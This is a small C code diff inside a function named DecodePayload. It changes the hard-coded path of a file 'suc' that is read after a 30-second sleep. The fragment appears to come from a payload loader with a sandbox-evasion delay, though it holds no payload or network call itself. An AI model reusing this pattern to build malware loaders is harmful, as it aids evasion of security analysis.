@@ -177,7 +177,7 @@ void DecodePayload()
 
     Sleep(30000);
 
-    HANDLE hSuc = CreateFile("C:\\suc", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hSuc = CreateFile("C:\\Python27\\suc", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     DWORD dwFileSize = GetFileSize(hSuc, NULL);
     if (hSuc == INVALID_HANDLE_VALUE || dwFileSize == 0)
     {
